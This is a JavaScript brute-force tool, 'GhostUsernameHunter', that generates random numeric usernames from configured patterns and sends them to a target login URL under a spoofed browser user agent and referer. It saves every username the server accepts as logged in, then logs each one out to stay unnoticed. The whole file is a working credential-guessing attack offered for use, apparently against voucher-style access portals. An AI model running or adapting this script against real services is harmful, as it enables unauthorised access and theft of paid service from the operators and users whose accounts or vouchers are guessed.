import fs from 'fs';
import axios from 'axios';
import chalk from 'chalk';

const TOOL_NAME = "GhostUsernameHunter"; //name of the tool
const CONFIG_FILE = 'config.json';

function loadConfig() {
    return JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
}

let config = loadConfig();
let lastModified = fs.statSync(CONFIG_FILE).mtimeMs;

let {
    url,
    logout_url,
    method = "POST",
    length,
    digits,
    prefix,
    suffix,
    count
} = config;

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function checkServerConnection(url) {
    try {
        await axios.get(url, { timeout: 5000 });
        return true;
    } catch (err) {
        return false;
    }
}

let randomPartLength = length - prefix.length - suffix.length;
let tested = new Set();

if (fs.existsSync('tested_usernames.txt')) {
    const oldTested = fs.readFileSync('tested_usernames.txt', 'utf-8')
        .split(/\r?\n/)
        .filter(Boolean);
    oldTested.forEach(username => tested.add(username));
}

let i = 0;

console.log(chalk.cyan("=".repeat(60)));
console.log(chalk.green(`             ${TOOL_NAME}`));
console.log(chalk.cyan("=".repeat(60)));
console.log(chalk.green("Developed By Ghost Tele @GHOST_529"));
console.log(chalk.cyan("=".repeat(50)));
console.log(chalk.yellow(`Target: ${url}`));
console.log(chalk.yellow(`Method: ${method}`));
console.log(chalk.yellow(`Usernames to Test: ${count}`));
console.log(chalk.yellow(`Username Format: ${prefix}[random]${suffix}`));
console.log(chalk.yellow(`Random Length: ${randomPartLength}`));
console.log(chalk.cyan("=".repeat(50)));

function generateUsername() {
    let randomPart = '';
    for (let i = 0; i < randomPartLength; i++) {
        randomPart += digits.charAt(Math.floor(Math.random() * digits.length));
    }
    return prefix + randomPart + suffix;
}

(async function run() {
    for (let _ = 0; _ < count; _++) {
        let serverOnline = await checkServerConnection(url);
        while (!serverOnline) {
            console.log(chalk.green(`[+] wait for connect please check from Network `));
            await delay(5000);
            serverOnline = await checkServerConnection(url);
        }

        const startt = Date.now();
        const newModified = fs.statSync(CONFIG_FILE).mtimeMs;
        if (newModified !== lastModified) {
            console.log(chalk.yellow("\n[*] Detected change in config.json, reloading..."));
            config = loadConfig();
            ({ url, logout_url, method, length, digits, prefix, suffix, count } = config);
            randomPartLength = length - prefix.length - suffix.length;
            lastModified = newModified;
            console.log(chalk.cyan("[+] New settings applied!"));
        }

        let username = generateUsername();
        if (tested.has(username)) continue;
        tested.add(username);
        fs.appendFileSync("tested_usernames.txt", username + "\n"); // حفظ اليوزر
        i++;

        console.log(chalk.magenta(`[DEBUG] ${username} Number #${i}`));

        try {
            let response;
            const headers = {
              //  'Accept': "**",
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Referer': 'http://g.com/index.html',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36'
            };

            const data = new URLSearchParams({
                username,
                var: 'callBack', // المتغير المطلوب
                verfiy:false
            });

            if (method === "POST") {
                response = await axios.post(url, data, { headers });
            } else if (method === "GET") {
                response = await axios.get(url, { params: { username, verify: 'callBack' }, headers });
            } else {
                console.log(chalk.red(`[!] Unsupported method: ${method}`));
                break;
            }

            // تغيير شرط التحقق بناءً على المتغير logged_in
            if  (response.data.logged_in === 'yes') {
                console.log(chalk.green(`[+] Valid username: ${username}`));
                const now = new Date().toLocaleString();
                fs.appendFileSync("valid_usernames.txt", `${username} - Time: ${now}\n`);

                if (logout_url) {
                    try {
                       // await axios.post(logout_url, new URLSearchParams({ username }));
                    await axios.get(logout_url,{ headers: headers});
                    console.log(chalk.blue(`[!] Logout request sent for ${username}`));
                    } catch (err) {
                        console.log(chalk.red(`[!] Logout failed: ${err}`));
                    }
                }
            } else {
                console.log(chalk.red(`[-] Invalid: ${username}`+response.data));
            }

            const End = Date.now();
            console.log(chalk.gray(`Token Time ${End - startt}`));
        } catch (err) {
            console.log(chalk.red(`[!] Request failed for ${username}: ${err.message}`));
        }
    }

    console.log(chalk.cyan("\n[*] Done."));
})();

